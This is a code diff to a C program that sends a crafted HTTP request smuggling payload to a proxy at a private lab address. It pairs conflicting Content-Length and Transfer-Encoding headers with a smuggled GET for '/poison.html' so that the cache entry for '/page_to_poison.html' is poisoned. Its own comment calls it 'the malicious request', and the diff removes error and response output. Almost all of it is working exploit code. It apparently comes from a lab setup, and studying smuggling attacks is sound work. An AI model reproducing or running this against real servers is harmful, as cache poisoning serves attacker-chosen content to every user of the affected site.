@@ -12,17 +12,12 @@ int main() {
     struct sockaddr_in server_addr;
     char request[1024];
     char buffer[4096];
-    char* body =         "\r\n";
-        // "0\r\n\r\n"
-        // "GET /page_to_poison.html HTTP/1.1\r\n"
-        // "Host: 192.168.1.201\r\n"
-        // "Something: ";
-    printf("body length is : %ld\n", strlen(body));
+
     
     // Create socket
     sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock < 0) {
-        perror("Socket creation failed");
+        //perror("Socket creation failed");
         return 1;
     }
 
@@ -33,42 +28,32 @@ int main() {
 
     // Connect to the proxy server
     if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
-        perror("Connection failed");
+        //perror("Connection failed");
         close(sock);
         return 1;
     }
     // 💡 Updated request with Connection: Keep-Alive and TE.CL technique
     snprintf(request, sizeof(request),
         "POST /doomle.html HTTP/1.1\r\n"
-        "Host: 192.168.1.201\r\n"
+        "Host: 192.168.1.202\r\n"
         "Content-Type: text/html\r\n"
-        "Content-Length: 57\r\n"
+        "Content-Length: 0\r\n"
         "Transfer-Encoding: chunked\r\n"
         "Connection: Keep-Alive\r\n"
         "\r\n"
-        "0\r\n\r\n"
+        
+        "32\r\n"
+        "GET /poison.html HTTP/1.1\r\n"//35
+        "Host: 192.168.1.202\r\n\r\n"//23
+        "\r\n0\r\n\r\n"
 
         "GET /page_to_poison.html HTTP/1.1\r\n"
-        "Host: 192.168.1.201\r\n"
-        "Something: GET /poison.html HTTP/1.1\r\n"
-        "Host: 192.168.1.201\r\n"
-        ""
-        "\r\n\r\n"
-        
-        //"GET /page_to_poison.html HTTP/1.1\r\n"  // Smuggled request
-        //"Host: 192.168.1.201\r\n"
-        //"Connection: Keep-Alive\r\n"  // Close after smuggling
-        //"Something: GET /poison.html HTTP/1.1\r\n"
-        //"\r\n"
-
-// End of first request
-
-        );
+        "Host: 192.168.1.202\r\n\r\n");
 
 
     // Send the malicious request
     if (send(sock, request, strlen(request), 0) < 0) {
-        perror("Send failed");
+        //perror("Send failed");
         close(sock);
         return 1;
     }
@@ -77,10 +62,7 @@ int main() {
     int received =recv(sock, buffer, sizeof(buffer) - 1, 0);
     if (received > 0) {
         buffer[received] = '\0';
-        printf("Server response:\n%s\n", buffer);
-    } else {
-        perror("No response received");
-    }
+    } 
 
     // Close socket
     close(sock);
